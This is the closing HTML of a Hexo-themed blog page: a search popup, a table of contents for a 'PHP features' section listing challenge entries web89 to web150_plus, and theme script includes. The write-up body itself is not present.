        <div class="search-pop-overlay">
    <div class="popup search-popup">
        <div class="search-header">
          <span class="search-input-field-pre">
            <i class="fas fa-keyboard"></i>
          </span>
            <div class="search-input-container">
                <input autocomplete="off"
                       autocorrect="off"
                       autocapitalize="off"
                       placeholder="æœç´¢..."
                       spellcheck="false"
                       type="search"
                       class="search-input"
                >
            </div>
            <span class="close-popup-btn">
                <i class="fas fa-times"></i>
            </span>
        </div>
        <div id="search-result">
            <div id="no-result">
                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
            </div>
        </div>
    </div>
</div>

    

    <!-- tablet toc -->
    
        <div class="tablet-post-toc-mask">
            <div class="tablet-post-toc">
                <div class="post-toc-wrap border-box">
    <div class="post-toc border-box">
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E7%89%B9%E6%80%A7"><span class="nav-text">PHPç‰¹æ€§</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web89"><span class="nav-text">web89</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web90"><span class="nav-text">web90</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web91"><span class="nav-text">web91</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web92"><span class="nav-text">web92</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web93"><span class="nav-text">web93</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web94"><span class="nav-text">web94</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web95"><span class="nav-text">web95</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web96"><span class="nav-text">web96</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web97"><span class="nav-text">web97</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web98"><span class="nav-text">web98</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web99"><span class="nav-text">web99</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web100"><span class="nav-text">web100</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web101"><span class="nav-text">web101</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web102"><span class="nav-text">web102</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web103"><span class="nav-text">web103</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web104"><span class="nav-text">web104</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web105"><span class="nav-text">web105</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web106"><span class="nav-text">web106</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web107"><span class="nav-text">web107</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web108"><span class="nav-text">web108</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web109"><span class="nav-text">web109</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web110"><span class="nav-text">web110</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web111"><span class="nav-text">web111</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web112"><span class="nav-text">web112</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web113"><span class="nav-text">web113</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web114"><span class="nav-text">web114</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web115"><span class="nav-text">web115</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web123"><span class="nav-text">web123</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web125"><span class="nav-text">web125</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web126"><span class="nav-text">web126</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web127"><span class="nav-text">web127</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web128"><span class="nav-text">web128</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web129"><span class="nav-text">web129</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web130"><span class="nav-text">web130</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web131"><span class="nav-text">web131</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web132"><span class="nav-text">web132</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web133"><span class="nav-text">web133</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web134"><span class="nav-text">web134</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web135"><span class="nav-text">web135</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web136"><span class="nav-text">web136</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web137"><span class="nav-text">web137</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web138"><span class="nav-text">web138</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web139"><span class="nav-text">web139</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web140"><span class="nav-text">web140</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web141"><span class="nav-text">web141</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web142"><span class="nav-text">web142</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web143"><span class="nav-text">web143</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web144"><span class="nav-text">web144</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web155"><span class="nav-text">web155</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web146"><span class="nav-text">web146</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web147"><span class="nav-text">web147</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web148"><span class="nav-text">web148</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web149"><span class="nav-text">web149</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web150"><span class="nav-text">web150</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web150-plus"><span class="nav-text">web150_plus</span></a></li></ol></li></ol></li></ol>
    </div>
</div>

            </div>
        </div>
    
</main>



<!-- common -->
<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/toggle-theme.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/code-block.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/libs/anime.min.js"></script>

<!-- local-search -->

    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/local-search.js"></script>


<!-- lazyload -->

    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/lazyload.js"></script>


<div class="">
    
        <!-- post-helper -->
        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/post-helper.js"></script>

        <!-- toc -->
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/toc.js"></script>
        

        <!-- copyright-info -->
        
            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@4.1.1/source/js/post/copyright-info.js"></script>
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



    
        
    

</body>
</html>
